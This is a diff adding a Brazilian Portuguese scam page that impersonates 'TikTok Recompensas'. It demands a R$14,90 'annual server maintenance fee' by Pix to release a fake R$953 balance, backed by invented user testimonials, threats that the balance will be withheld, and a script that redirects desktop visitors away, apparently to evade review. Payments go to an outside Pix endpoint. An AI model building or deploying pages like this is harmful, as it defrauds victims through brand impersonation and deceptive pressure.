@@ -1,0 +1,939 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Recompensas – Manutenção de Servidores</title>
+
+
+
+
+
+
+
+
+    <script type="text/javascript">
+        if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+            window.location.href = 'https://image.1111down.com/xG1nkqKTMzGDvpLrqFT7WA/ef311940-320d-4b47-94ef-600f2eafd920/width=450/1272375.jpeg';
+        }
+    </script>
+
+
+
+
+
+
+
+
+
+
+    <!-- Dependências replicadas da sua página principal que já funciona -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <script src="js/A2HJRWwpU6rQ.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap"
+        rel="stylesheet">
+    <script src="js/ZssqwwX3ERTe.js" defer=""></script>
+
+    <style>
+        /* Estilos CSS embutidos para replicar 100% o visual e funcionamento da sua página principal */
+        :root {
+            --tt-red: #FE2C55;
+            --tt-blue: #25F4EE;
+            --light-bg-main: #F1F2F5;
+            --white-card-bg: #FFFFFF;
+            --text-main-dark: #161823;
+            --text-secondary-light: #565D6C;
+            --border-subtle: #EBEBEB;
+            --money-green: #25D366;
+            --money-green-dark: #1A8D49;
+            --white: #ffffff;
+        }
+
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            font-family: 'Inter', Arial, sans-serif;
+            background: var(--light-bg-main);
+            color: var(--text-main-dark);
+            -webkit-font-smoothing: antialiased;
+            overflow-x: hidden;
+        }
+
+        body.body-no-scroll {
+            overflow: hidden;
+        }
+
+        .main-content {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex-grow: 1;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 428px;
+            background: var(--light-bg-main);
+            padding-bottom: 2rem;
+        }
+
+        .header {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: .75rem 1rem;
+            background: var(--white-card-bg);
+            border-bottom: 1px solid var(--border-subtle);
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.03);
+        }
+
+        .logo-img {
+            height: 32px;
+            object-fit: contain;
+        }
+
+        @keyframes pulseWarning {
+
+            0%,
+            100% {
+                transform: scale(1);
+                box-shadow: 0 5px 20px rgba(254, 44, 85, 0.25);
+            }
+
+            50% {
+                transform: scale(1.03);
+                box-shadow: 0 8px 25px rgba(254, 44, 85, 0.4);
+            }
+        }
+
+        @keyframes scaleIn {
+            0% {
+                opacity: 0;
+                transform: scale(.95);
+            }
+
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes dots-anim {
+
+            0%,
+            80%,
+            100% {
+                transform: scale(0);
+            }
+
+            40% {
+                transform: scale(1.0);
+            }
+        }
+
+        @keyframes check-in {
+            0% {
+                transform: scale(0);
+                opacity: 0;
+            }
+
+            50% {
+                transform: scale(1.2);
+                opacity: 1;
+            }
+
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .main-card {
+            background: var(--white-card-bg);
+            margin: 1.25rem;
+            padding: 2rem 1.5rem;
+            border-radius: 1.25rem;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.05);
+            text-align: center;
+        }
+
+        .main-card .icon-header {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background-color: rgba(37, 244, 238, 0.1);
+            color: var(--tt-blue);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1rem;
+        }
+
+        .main-card h1 {
+            font-size: 1.5rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+        }
+
+        .main-card .balance-info {
+            font-size: 1rem;
+            color: var(--text-secondary-light);
+            margin-bottom: 1rem;
+            line-height: 1.5;
+        }
+
+        .main-card .balance-amount {
+            font-size: 2.2rem;
+            font-weight: 900;
+            color: var(--money-green);
+            margin-bottom: 1.5rem;
+        }
+
+        .info-section {
+            text-align: left;
+            font-size: 0.95rem;
+            line-height: 1.6;
+            margin: 1.5rem 0;
+        }
+
+        .info-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 0.75rem;
+            margin-bottom: 1rem;
+        }
+
+        .info-item .icon {
+            color: var(--tt-red);
+            width: 20px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .fee-section {
+            padding-top: 1.5rem;
+            margin-top: 1.5rem;
+            border-top: 1px dashed var(--border-subtle);
+        }
+
+        .fee-section .fee-title {
+            font-size: 1rem;
+            font-weight: 500;
+            color: var(--text-secondary-light);
+            margin-bottom: 0.25rem;
+        }
+
+        .fee-section .fee-amount {
+            font-size: 1.8rem;
+            font-weight: 800;
+        }
+
+        .warning-notice {
+            background-color: rgba(254, 44, 85, 0.05);
+            border: 1px solid rgba(254, 44, 85, 0.2);
+            padding: 1rem;
+            border-radius: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-size: 0.9rem;
+            font-weight: 500;
+            line-height: 1.5;
+            text-align: left;
+            margin-bottom: 1.5rem;
+        }
+
+        .warning-notice .icon {
+            color: var(--tt-red);
+            flex-shrink: 0;
+        }
+
+        .btn-cta {
+            width: 100%;
+            padding: 1.1rem;
+            font-size: 1.05rem;
+            font-weight: 800;
+            border: none;
+            border-radius: .75rem;
+            color: var(--white);
+            background: linear-gradient(90deg, #FE2C55 0%, #d42044 100%);
+            cursor: pointer;
+            transition: all .2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            box-shadow: 0 5px 20px rgba(254, 44, 85, 0.25);
+            animation: pulseWarning 2s infinite;
+        }
+
+        .btn-cta:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(254, 44, 85, 0.3);
+        }
+
+        .btn-cta:disabled {
+            background: #ccc;
+            color: #888;
+            cursor: not-allowed;
+            box-shadow: none;
+            animation: none;
+        }
+
+        .processing-notice {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            margin-top: 1rem;
+            font-size: 0.875rem;
+            color: var(--text-secondary-light);
+        }
+
+        .testimonials-wrapper {
+            padding: 1rem 1.25rem;
+        }
+
+        .testimonials-wrapper h2 {
+            font-size: 1.25rem;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .testimonial-card {
+            background: var(--white-card-bg);
+            padding: 1rem;
+            border-radius: 1rem;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.05);
+            margin-bottom: 1rem;
+        }
+
+        .testimonial-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 0.5rem;
+        }
+
+        .author-info {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .author-info img {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+        }
+
+        .author-info .name {
+            font-weight: 700;
+            font-size: 0.95rem;
+        }
+
+        .testimonial-header .time {
+            font-size: 0.8rem;
+            color: var(--text-secondary-light);
+        }
+
+        .testimonial-body {
+            font-size: 0.9rem;
+            line-height: 1.5;
+            color: #555;
+        }
+
+        /* Estilos do Popup (copiados da sua página principal) */
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, .6);
+            backdrop-filter: blur(4px);
+            display: flex;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity .3s, visibility .3s;
+            z-index: 100;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem
+        }
+
+        .overlay.show {
+            opacity: 1;
+            visibility: visible
+        }
+
+        .pix-popup {
+            background: var(--white-card-bg);
+            width: 100%;
+            max-width: 400px;
+            animation: scaleIn .4s cubic-bezier(.18, .89, .32, 1.28);
+            box-shadow: 0 5px 30px rgba(0, 0, 0, .15);
+            display: flex;
+            flex-direction: column;
+            border-radius: 1.25rem;
+            max-height: 95vh
+        }
+
+        .pix-body {
+            overflow-y: auto;
+            text-align: center
+        }
+
+        .pix-payment-screen .pix-body {
+            padding: 1.25rem;
+            display: flex;
+            flex-direction: column
+        }
+
+        .pix-popup-header {
+            text-align: center;
+            margin-bottom: 1.25rem;
+            border-bottom: 1px solid var(--border-subtle);
+            padding-bottom: 1.25rem
+        }
+
+        .pix-logo {
+            height: 28px;
+            margin-bottom: .75rem
+        }
+
+        .pix-product-name,
+        .pix-product-title {
+            margin-bottom: .25rem
+        }
+
+        .pix-product-name {
+            font-size: .9rem;
+            color: var(--text-secondary-light)
+        }
+
+        .pix-product-title {
+            font-size: 1rem;
+            font-weight: 700
+        }
+
+        .pix-amount {
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: var(--tt-red)
+        }
+
+        .pix-instructions {
+            text-align: center;
+            font-weight: 500;
+            margin-bottom: .5rem;
+            font-size: .95rem
+        }
+
+        #qr-code-container {
+            width: 200px;
+            height: 200px;
+            border: 2px solid var(--border-subtle);
+            border-radius: .75rem;
+            margin: 0 auto 1.25rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 8px;
+            background-color: var(--white-card-bg)
+        }
+
+        .pix-key-container {
+            display: flex;
+            background-color: var(--light-bg-main);
+            border: 1px solid var(--border-subtle);
+            border-radius: .75rem;
+            margin-bottom: 1.25rem;
+            padding: .5rem;
+            align-items: center
+        }
+
+        #pix-key-text {
+            flex-grow: 1;
+            font-size: .85rem;
+            word-break: break-all;
+            line-height: 1.5;
+            padding: .5rem
+        }
+
+        #copy-key-btn {
+            flex-shrink: 0;
+            width: 44px;
+            height: 44px;
+            border: none;
+            border-radius: .5rem;
+            background-color: var(--tt-red);
+            color: var(--white);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color .2s
+        }
+
+        #copy-key-btn.copied {
+            background-color: var(--money-green)
+        }
+
+        #paid-btn {
+            width: 100%;
+            border: none;
+            padding: .85rem;
+            border-radius: .75rem;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: .55rem;
+            transition: all .3s ease;
+            background-color: var(--money-green);
+            color: var(--white)
+        }
+
+        #paid-btn:disabled {
+            background-color: #bdc3c7;
+            cursor: not-allowed
+        }
+
+        .pix-footer {
+            margin-top: auto;
+            text-align: center
+        }
+
+        .pix-timer-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: .5rem;
+            font-size: .9rem;
+            color: var(--text-secondary-light);
+            margin-bottom: .75rem
+        }
+
+        .awaiting-payment-screen .pix-body {
+            padding: 2.5rem 1.5rem
+        }
+
+        #awaiting-loader-container {
+            position: relative;
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 1.5rem
+        }
+
+        #awaiting-loader-container .await-timer-svg {
+            transform: rotate(-90deg);
+            width: 100%;
+            height: 100%
+        }
+
+        .awaiting-loader-circle {
+            stroke: var(--tt-red);
+            stroke-width: 8;
+            fill: transparent;
+            transition: stroke-dashoffset 1s linear
+        }
+
+        .awaiting-loader-bg {
+            stroke: var(--border-subtle);
+            stroke-width: 8;
+            fill: transparent
+        }
+
+        #awaiting-loader-container .await-timer-text {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--tt-red)
+        }
+
+        .awaiting-payment-screen h2 {
+            font-size: 1.5rem;
+            font-weight: 800;
+            margin-bottom: .5rem
+        }
+
+        .awaiting-payment-screen p {
+            font-size: 1rem;
+            color: var(--text-secondary-light);
+            line-height: 1.5;
+            margin-bottom: 2rem
+        }
+
+        #did-not-pay-btn {
+            background: none;
+            border: none;
+            color: var(--text-secondary-light);
+            font-weight: 500;
+            font-size: .9rem;
+            text-decoration: underline;
+            cursor: pointer
+        }
+
+        #back-to-payment-btn {
+            width: 100%;
+            border: 1px solid var(--border-subtle);
+            color: var(--text-main-dark);
+            margin-top: 1rem;
+            font-weight: 600;
+            padding: .85rem;
+            border-radius: .75rem;
+            background-color: var(--white);
+            cursor: pointer;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            gap: .5rem
+        }
+
+        .approved-screen .pix-body {
+            padding: 2.5rem 1.5rem;
+            align-items: center;
+            justify-content: center
+        }
+
+        .approved-icon-container {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            background-color: var(--money-green);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1.5rem;
+            animation: check-in .5s cubic-bezier(.18, .89, .32, 1.28)
+        }
+
+        .approved-icon-container i {
+            color: var(--white);
+            width: 50px;
+            height: 50px
+        }
+
+        .approved-screen h2 {
+            font-size: 1.8rem;
+            font-weight: 800;
+            margin-bottom: .5rem
+        }
+
+        .approved-screen p {
+            font-size: 1.1rem;
+            color: var(--text-secondary-light);
+            line-height: 1.6
+        }
+
+        .loading-dots {
+            margin-top: 1.5rem
+        }
+
+        .loading-dots span {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background-color: var(--tt-red);
+            border-radius: 50%;
+            margin: 0 4px;
+            animation: dots-anim 1.4s infinite ease-in-out both
+        }
+
+        .loading-dots span:nth-child(1) {
+            animation-delay: -.32s
+        }
+
+        .loading-dots span:nth-child(2) {
+            animation-delay: -.16s
+        }
+
+        #pre-pix-loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(249, 249, 249, .95);
+            backdrop-filter: blur(5px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 1.5rem;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity .3s ease-out, visibility .3s ease-out;
+            z-index: 150;
+            padding: 1rem
+        }
+
+        #pre-pix-loading-overlay.show {
+            opacity: 1;
+            visibility: visible
+        }
+
+        .loading-progress-container {
+            background: var(--white-card-bg);
+            padding: 2.5rem 2rem;
+            border-radius: 1.25rem;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, .1);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            animation: scaleIn .5s ease-out
+        }
+
+        .loading-header {
+            margin-bottom: 1.5rem
+        }
+
+        .loading-header .loading-logo {
+            height: 36px;
+            margin-bottom: 1rem
+        }
+
+        .loading-header h2 {
+            font-size: 1.4rem;
+            font-weight: 800;
+            margin-bottom: .5rem
+        }
+
+        .loading-header p {
+            font-size: 1rem;
+            color: var(--text-secondary-light)
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            height: 8px;
+            background-color: var(--border-subtle);
+            border-radius: 4px;
+            margin-bottom: 2rem;
+            overflow: hidden
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--tt-red), var(--tt-cyan));
+            border-radius: 4px;
+            transition: width .5s ease-out
+        }
+
+        .loading-steps {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            text-align: left
+        }
+
+        .loading-steps li {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: .8rem 0;
+            font-size: .95rem;
+            font-weight: 500;
+            opacity: .5;
+            transition: opacity .4s, color .4s
+        }
+
+        .loading-steps li.active {
+            opacity: 1;
+            font-weight: 600;
+            color: var(--text-main-dark)
+        }
+
+        .loading-steps li.completed {
+            opacity: 1;
+            color: var(--text-secondary-light)
+        }
+
+        .loading-steps li.completed .step-icon {
+            color: var(--money-green)
+        }
+
+        .loading-steps li.completed span {
+            text-decoration: line-through
+        }
+
+        .loading-steps .step-icon {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--tt-red);
+            transition: color .4s;
+            flex-shrink: 0
+        }
+
+        .step-icon .spinner {
+            animation: spin 1.2s linear infinite
+        }
+
+        .step-icon .completed-icon {
+            animation: scaleIn .4s ease
+        }
+    </style>
+</head>
+
+<body>
+    <div class="main-content">
+        <div class="wrapper">
+            <header class="header">
+                <img src="images/bnm1nLtWNnGc.png" alt="TikTok Logo" class="logo-img"
+                    onerror="this.onerror=null;this.style.display='none';">
+            </header>
+
+            <main class="main-card">
+                <div class="icon-header"><i data-lucide="server"></i></div>
+                <h1>Taxa de Manutenção Anual dos Servidores</h1>
+                <p class="balance-info">Para manter a plataforma TikTok Recompensas rápida, segura e disponível para
+                    todos, realizamos uma manutenção anual em nossos servidores. Esta taxa garante sua vaga e a
+                    performance do aplicativo.</p>
+
+                <div class="info-section">
+                    <div class="info-item"><i data-lucide="gauge-circle" class="icon"></i><span><strong>Performance
+                                Máxima:</strong> Garanta que seus saques e o uso do app continuem instantâneos.</span>
+                    </div>
+                    <div class="info-item"><i data-lucide="shield-check" class="icon"></i><span><strong>Segurança
+                                Reforçada:</strong> Mantenha seus dados e saldo protegidos com as últimas tecnologias de
+                            segurança.</span></div>
+                    <div class="info-item"><i data-lucide="award" class="icon"></i><span><strong>Acesso VIP:</strong>
+                            Como membro ativo, você terá acesso a bônus e promoções exclusivas durante o ano.</span>
+                    </div>
+                </div>
+
+                <div class="fee-section">
+                    <p class="fee-title">Saldo pendente que será liberado:</p>
+                    <p class="balance-amount">R$ 953,00</p>
+                    <p class="fee-title">Taxa Anual de Manutenção (pagamento único):</p>
+                    <p id="fee-amount-display" class="fee-amount" style="color: var(--tt-red);"></p>
+                </div>
+
+                <div class="warning-notice">
+                    <i data-lucide="alert-triangle" class="icon"></i>
+                    <span><strong>Aviso Importante:</strong> A confirmação da taxa é necessária para liberar o seu saldo
+                        pendente. Sem ela, sua vaga pode ser repassada para outro usuário e os valores (saldo e taxa
+                        inicial) ficarão retidos.</span>
+                </div>
+
+                <button id="cta-btn" class="btn-cta">
+                    <i data-lucide="lock" class="icon"></i>
+                    <span id="cta-btn-text">Pagar Taxa e Liberar Saldo de R$ 953,00</span>
+                </button>
+                <div class="processing-notice"><i data-lucide="lock" class="icon"></i><span>Pagamento 100%
+                        seguro.</span></div>
+            </main>
+
+            <section class="testimonials-wrapper">
+                <h2>O que outros usuários VIPs dizem:</h2>
+                <div class="testimonial-card">
+                    <div class="testimonial-header">
+                        <div class="author-info"><img src="https://placehold.co/40x40/EFEFEF/333333?text=AG"
+                                alt="Avatar"><span class="name">André G.</span></div>
+                        <span class="time">há 3 min</span>
+                    </div>
+                    <p class="testimonial-body">"Confesso que fiquei na dúvida, mas paguei a taxa de manutenção e o
+                        saldo caiu na hora. O app ficou até mais rápido pra mim. Justo."</p>
+                </div>
+                <div class="testimonial-card">
+                    <div class="testimonial-header">
+                        <div class="author-info"><img src="https://placehold.co/40x40/EFEFEF/333333?text=MJ"
+                                alt="Avatar"><span class="name">Mariana J.</span></div>
+                        <span class="time">há 8 min</span>
+                    </div>
+                    <p class="testimonial-body">"É o custo pra manter a plataforma funcionando bem, gente. Paguei e já
+                        saquei meus R$953. Simples assim."</p>
+                </div>
+                <div class="testimonial-card">
+                    <div class="testimonial-header">
+                        <div class="author-info"><img src="https://placehold.co/40x40/EFEFEF/333333?text=RF"
+                                alt="Avatar"><span class="name">Ricardo F.</span></div>
+                        <span class="time">há 15 min</span>
+                    </div>
+                    <p class="testimonial-body">"Essa taxa é como a anuidade de um cartão bom, vale a pena pelos
+                        benefícios. Meu acesso a saques ilimitados foi garantido."</p>
+                </div>
+                <div class="testimonial-card">
+                    <div class="testimonial-header">
+                        <div class="author-info"><img src="https://placehold.co/40x40/EFEFEF/333333?text=LS"
+                                alt="Avatar"><span class="name">Luiza S.</span></div>
+                        <span class="time">há 21 min</span>
+                    </div>
+                    <p class="testimonial-body">"Deu tudo certo. Paguei os R$14,90 e o saque maior foi liberado. O
+                        suporte me explicou que é para os custos dos servidores."</p>
+                </div>
+            </section>
+        </div>
+    </div>
+
+    <!-- Script de inicialização da página -->
+    <script src="js/DsYdXFEFq79q.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            lucide.createIcons();
+
+            const productInfo = {
+                id: 'taxa-verificacao',
+                name: 'Tiktok - Taxa Anual de Manutenção',
+                apiname: 'Alce',
+                priceInCents: 1490,
+                nextPage: '../up2'
+            };
+            const apiEndpoints = {
+                generatePix: 'https://site-clientes.info/zero-api/pix.php',
+                checkStatus: 'https://site-clientes.info/zero-api/status.php'
+            };
+
+            const brandInfo = {
+                name: 'TikTok',
+                logoUrl: '../../complementares/images/bnm1nLtWNnGc.png',
+                countdownSeconds: 10,
+                paidBtnDelay: 15,
+            };
+
+            const feeDisplay = document.getElementById('fee-amount-display');
+            if (feeDisplay) {
+                feeDisplay.textContent = (productInfo.priceInCents / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+            }
+
+            initializePaymentFlow(productInfo, apiEndpoints, brandInfo);
+        });
+    </script>
+
+
+</body>
+
+</html>
